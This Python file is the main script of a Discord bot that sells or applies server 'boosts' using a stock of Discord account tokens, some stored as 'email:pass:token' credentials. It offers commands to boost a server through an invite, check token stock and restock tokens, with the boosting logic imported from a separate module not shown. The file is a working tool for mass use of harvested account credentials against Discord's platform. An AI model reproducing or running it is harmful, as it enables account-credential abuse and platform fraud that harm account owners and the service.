import os
import sys
import time
import yaml
import asyncio
import discord
from discord.ext import commands
from discord.ui import View, Button, Modal, TextInput

import coderz
from coderz import BoostModal, getStock, getinviteCode, checkInvite, Booster, remove, create_session_folder
from keep_alive import keep_alive

def load_config():
    try:
        with open("config/config.yaml", "r", encoding="utf-8") as f:
            return yaml.safe_load(f) or {}
    except FileNotFoundError:
        return {}

config = load_config()

# Support both Render Environment Variables and config.yaml
bot_token = os.environ.get("BOT_TOKEN") or config.get("discord", {}).get("bot_token", "").strip()
prefix = os.environ.get("PREFIX") or config.get("discord", {}).get("prefix", "$")

# Hardcoded Owner ID: Only this Discord user can run commands
HARDCODED_OWNER_ID = 1505515188991033409

env_owners = os.environ.get("OWNER_IDS", "")
if env_owners:
    owner_ids = [int(i.strip()) for i in env_owners.split(",") if i.strip().isdigit()]
else:
    owner_ids = [int(i) for i in config.get("discord", {}).get("owner_ids", []) if str(i).isdigit()]

if HARDCODED_OWNER_ID not in owner_ids:
    owner_ids.append(HARDCODED_OWNER_ID)

def is_authorized(user: discord.User, member: discord.Member = None) -> bool:
    # Strictly lock down: Only the hardcoded owner or explicit owner IDs can execute commands
    return user.id in owner_ids


intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None)

class BoostLaunchView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 Boost a Server", style=discord.ButtonStyle.primary, custom_id="boost_modal_btn")
    async def boost_button(self, interaction: discord.Interaction, button: Button):
        if not is_authorized(interaction.user, getattr(interaction, "user", None)):
            return await interaction.response.send_message("❌ You are not authorized to use this boost panel.", ephemeral=True)
        await interaction.response.send_modal(BoostModal())

@bot.event
async def on_ready():
    print("=" * 50)
    print(f" [+] Bot Logged in as: {bot.user.name} ({bot.user.id})")
    print(f" [+] Prefix: {prefix}")
    if owner_ids:
        print(f" [+] Authorized Owners: {owner_ids}")
    else:
        print(f" [+] Access: Server Administrators (add owner_ids in config.yaml to lock down)")
    print(f" [+] Use {prefix}boost or {prefix}stock in Discord")
    print("=" * 50)
    try:
        synced = await bot.tree.sync()
        print(f" [+] Synced {len(synced)} Slash Commands.")
    except Exception as e:
        print(f" [-] Failed to sync slash commands: {e}")

@bot.tree.command(name="boost", description="Open the Discord server booster panel")
async def slash_boost(interaction: discord.Interaction):
    if not is_authorized(interaction.user, getattr(interaction, "user", None)):
        return await interaction.response.send_message("❌ You are not authorized to use the booster.", ephemeral=True)
    await interaction.response.send_modal(BoostModal())

@bot.command(name="boost")
async def cmd_boost(ctx: commands.Context, invite: str = None, amount: int = None, months: int = None):
    """
    Usage:
      $boost -> Opens interactive boost popup button
      $boost <invite> <amount> <months> -> Boosts directly
    """
    if not is_authorized(ctx.author, getattr(ctx, "author", None)):
        return await ctx.send(embed=discord.Embed(
            title="❌ Access Denied",
            description="You are not authorized to spend boost tokens.",
            color=0xFF0000
        ))

    # If no parameters provided, send button to open the modal popup
    if not invite or not amount or not months:
        embed = discord.Embed(
            title="🚀 Discord Server Booster",
            description="Click the button below to enter your server invite, boost amount, and duration.",
            color=0x5865F2
        )
        embed.add_field(name="Direct Command Usage", value=f"`{prefix}boost <invite> <amount> <months>`\nExample: `{prefix}boost discord.gg/example 2 1`", inline=False)
        embed.set_footer(text="BoostBot by .gg/coderz")
        view = BoostLaunchView()
        return await ctx.send(embed=embed, view=view)

    # Validate parameters
    if amount % 2 != 0 or amount <= 0:
        return await ctx.send(embed=discord.Embed(
            title="❌ Invalid Amount",
            description="Number of boosts must be an even positive number (each token provides 2 boosts).",
            color=0xFF0000
        ))

    if months not in [1, 3]:
        return await ctx.send(embed=discord.Embed(
            title="❌ Invalid Duration",
            description="Months must be either `1` or `3`.",
            color=0xFF0000
        ))

    invite_code = getinviteCode(invite)
    guild_id = checkInvite(invite_code)

    if not guild_id:
        return await ctx.send(embed=discord.Embed(
            title="❌ Invalid Invite",
            description=f"Could not reach server with invite code: `{invite_code}`",
            color=0xFF0000
        ))

    filename = "data/1m.txt" if months == 1 else "data/3m.txt"
    stock = getStock(filename) or []
    required_tokens = int(amount / 2)

    if required_tokens > len(stock):
        return await ctx.send(embed=discord.Embed(
            title="❌ Out of Stock",
            description=f"Need `{required_tokens}` tokens ({amount} boosts), but only `{len(stock)}` available in `{filename}`.",
            color=0xFF0000
        ))

    # Reserve tokens
    tokens_to_use = stock[:required_tokens]
    for token in tokens_to_use:
        remove(token, filename)

    status_msg = await ctx.send(embed=discord.Embed(
        title="⏳ Boosting in Progress...",
        description=f"Applying `{amount}` boosts to **.gg/{invite_code}** using `{required_tokens}` tokens. Please wait...",
        color=0xFEE75C
    ))

    # Run blocking booster logic in background thread to prevent freezing the bot
    session_folder = create_session_folder()
    booster = Booster(session_folder)
    start_time = time.time()

    def do_boost():
        return booster.thread(invite_code, tokens_to_use, guild_id)

    status = await asyncio.to_thread(do_boost)
    elapsed = round(time.time() - start_time, 2)

    success_count = len(status.get("success", [])) * 2 if isinstance(status, dict) else 0
    failed_count = len(status.get("failed", [])) * 2 if isinstance(status, dict) else 0

    result_embed = discord.Embed(
        title="✅ Boosting Complete",
        description=f"Finished boosting **.gg/{invite_code}** in `{elapsed}s`.",
        color=0x57F287 if success_count > 0 else 0xED4245
    )
    result_embed.add_field(name="Successful Boosts", value=f"`{success_count}` applied", inline=True)
    result_embed.add_field(name="Failed Boosts", value=f"`{failed_count}` failed", inline=True)
    result_embed.add_field(name="Tokens Used", value=f"`{required_tokens}` tokens", inline=True)
    result_embed.set_footer(text="BoostBot by .gg/coderz")

    await status_msg.edit(embed=result_embed)

@bot.command(name="stock")
async def cmd_stock(ctx: commands.Context):
    """Check current stock of 1m and 3m tokens."""
    if not is_authorized(ctx.author, getattr(ctx, "author", None)):
        return await ctx.send(embed=discord.Embed(title="❌ Unauthorized", color=0xFF0000))

    tokens_1m = getStock("data/1m.txt") or []
    tokens_3m = getStock("data/3m.txt") or []

    embed = discord.Embed(title="📦 Current Token Stock", color=0x5865F2)
    embed.add_field(name="1-Month Tokens", value=f"`{len(tokens_1m)}` tokens (`{len(tokens_1m) * 2}` boosts)", inline=True)
    embed.add_field(name="3-Month Tokens", value=f"`{len(tokens_3m)}` tokens (`{len(tokens_3m) * 2}` boosts)", inline=True)
    embed.set_footer(text=f"Use {prefix}boost to apply boosts | Use {prefix}restock to add tokens")
    await ctx.send(embed=embed)

@bot.command(name="restock")
async def cmd_restock(ctx: commands.Context, duration: str = None, *, token_data: str = None):
    """
    Restock tokens directly from Discord (message is auto-deleted for privacy).
    Usage:
      $restock 1m <token or email:pass:token>
      $restock 3m <token or email:pass:token>
    """
    if not is_authorized(ctx.author, getattr(ctx, "author", None)):
        return await ctx.send(embed=discord.Embed(title="❌ Unauthorized", color=0xFF0000))

    if duration not in ["1m", "3m"] or not token_data:
        return await ctx.send(embed=discord.Embed(
            title="ℹ️ Restock Usage",
            description=f"`{prefix}restock <1m|3m> <token>`\n\nExample:\n`{prefix}restock 1m email:pass:token`\n(You can also paste multiple tokens on separate lines)",
            color=0x5865F2
        ))

    filename = "data/1m.txt" if duration == "1m" else "data/3m.txt"
    os.makedirs("data", exist_ok=True)

    tokens_added = 0
    with open(filename, "a", encoding="utf-8") as f:
        for line in token_data.strip().splitlines():
            line_clean = line.strip()
            if line_clean:
                f.write(line_clean + "\n")
                tokens_added += 1

    # Delete message with the raw tokens for privacy
    try:
        await ctx.message.delete()
    except Exception:
        pass

    current_stock = len(getStock(filename) or [])
    embed = discord.Embed(
        title="✅ Tokens Added to Stock",
        description=f"Added `{tokens_added}` tokens to **{duration}** stock.\n**Current Total**: `{current_stock}` tokens (`{current_stock * 2}` boosts).",
        color=0x57F287
    )
    await ctx.send(embed=embed)

@bot.command(name="help")
async def cmd_help(ctx: commands.Context):
    """Show help menu."""
    embed = discord.Embed(title="🤖 Booster Bot Commands", color=0x5865F2)
    embed.add_field(name=f"`{prefix}boost`", value="Opens the interactive boost panel popup.", inline=False)
    embed.add_field(name=f"`{prefix}boost <invite> <amount> <months>`", value="Directly boost a server (e.g. `$boost discord.gg/test 2 1`).", inline=False)
    embed.add_field(name=f"`{prefix}stock`", value="Shows currently available token stock.", inline=False)
    embed.add_field(name=f"`{prefix}restock <1m|3m> <tokens>`", value="Add tokens to stock directly via Discord.", inline=False)
    embed.add_field(name=f"`/boost`", value="Slash command version that pops up the boost modal.", inline=False)
    await ctx.send(embed=embed)


def main():
    if not bot_token:
        print("\n [!] ERROR: No bot token found!")
        print(" [!] Please set BOT_TOKEN environment variable or set 'bot_token' in config/config.yaml.")
        print(" [!] Example: bot_token: \"MTI...\"\n")
        # In cloud environments like Render, don't block on input()
        if not os.environ.get("RENDER"):
            input(" Press Enter to exit...")
        sys.exit(1)

    # Start 24/7 web server for Render health checks and uptime pingers
    keep_alive()

    # Load initial tokens from environment variables if present (useful on Render)
    for env_key, filepath in [("TOKENS_1M", "data/1m.txt"), ("TOKENS_3M", "data/3m.txt")]:
        tokens_raw = os.environ.get(env_key, "").strip()
        if tokens_raw:
            os.makedirs("data", exist_ok=True)
            with open(filepath, "a", encoding="utf-8") as f:
                for line in tokens_raw.replace("\\n", "\n").splitlines():
                    if line.strip():
                        f.write(line.strip() + "\n")
            print(f" [+] Loaded tokens from {env_key} into {filepath}")

    print(" [*] Connecting to Discord...")
    bot.run(bot_token)

if __name__ == "__main__":
    main()

